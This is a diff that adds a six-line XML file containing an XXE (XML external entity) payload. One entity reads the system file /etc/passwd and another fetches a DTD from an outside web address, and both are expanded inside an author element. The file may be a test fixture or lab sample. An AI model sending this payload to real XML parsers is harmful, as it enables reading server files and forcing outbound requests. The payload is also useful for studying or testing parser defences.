@@ -1,0 +1,6 @@
+<?xml version = "1.0" encoding = "utf-8"?>
+<!DOCTYPE test [
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+    <!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
+]>
+<author>&file;©right;</author>
